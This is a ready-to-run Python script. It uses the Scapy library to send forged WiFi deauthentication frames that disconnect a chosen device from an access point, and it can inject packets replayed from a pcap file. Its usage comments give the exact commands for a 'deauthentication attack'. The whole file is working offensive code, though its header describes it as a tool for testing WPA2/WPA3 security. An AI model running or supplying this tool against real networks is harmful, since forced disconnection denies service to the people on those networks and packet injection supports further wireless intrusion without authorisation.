import argparse
import time
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

# -------------------------------------------
# WiFi Deauthentication & Packet Injection
# -------------------------------------------
# Features:
# - Send deauthentication frames to disconnect devices from a WiFi network.
# - Inject custom packets (e.g., fake authentication requests).
# - Test WiFi security protocols (WPA2/WPA3).
#
# Requirements:
# - ESP8266 or LimeSDR Mini
# - Python 3.x
# - Scapy library
# - Monitor mode enabled on your wireless interface
#
# Usage:
# 1. Perform a deauthentication attack:
#    python wifi_deauth_injection.py --deauth --target XX:XX:XX:XX:XX:XX --ap YY:YY:YY:YY:YY:YY --interface wlan0
# 2. Inject a custom packet:
#    python wifi_deauth_injection.py --inject --packet "fake_packet.pcap" --interface wlan0
# -------------------------------------------

def deauth_attack(target_mac, ap_mac, interface, count=10):
    """
    Send deauthentication packets to disconnect a target device from the network.
    :param target_mac: MAC address of the target device.
    :param ap_mac: MAC address of the access point.
    :param interface: Wireless interface in monitor mode.
    :param count: Number of deauthentication packets to send.
    """
    print(f"[+] Starting deauthentication attack on {target_mac}...")
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    sendp(packet, iface=interface, count=count, inter=0.1, verbose=False)
    print("[✔] Deauthentication attack complete.")

def inject_packet(packet_file, interface):
    """
    Inject a custom packet from a .pcap file.
    :param packet_file: Path to the .pcap file containing the packet.
    :param interface: Wireless interface in monitor mode.
    """
    print(f"[+] Injecting packet from {packet_file}...")
    try:
        packets = rdpcap(packet_file)
        for packet in packets:
            sendp(packet, iface=interface, verbose=False)
        print("[✔] Packet injection complete.")
    except Exception as e:
        print(f"[!] Error during packet injection: {e}")

def main():
    parser = argparse.ArgumentParser(description="WiFi Deauthentication & Packet Injection")
    parser.add_argument("--deauth", action="store_true", help="Perform a deauthentication attack")
    parser.add_argument("--target", type=str, help="MAC address of the target device")
    parser.add_argument("--ap", type=str, help="MAC address of the access point")
    parser.add_argument("--inject", action="store_true", help="Inject a custom packet")
    parser.add_argument("--packet", type=str, help="Path to the .pcap file for packet injection")
    parser.add_argument("--interface", type=str, required=True, help="Wireless interface in monitor mode")
    parser.add_argument("--count", type=int, default=10, help="Number of deauthentication packets to send")
    args = parser.parse_args()

    if args.deauth:
        if not args.target or not args.ap:
            print("[!] Please specify both --target and --ap for deauthentication.")
            return
        deauth_attack(args.target, args.ap, args.interface, args.count)
    elif args.inject:
        if not args.packet:
            print("[!] Please specify --packet for injection.")
            return
        inject_packet(args.packet, args.interface)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()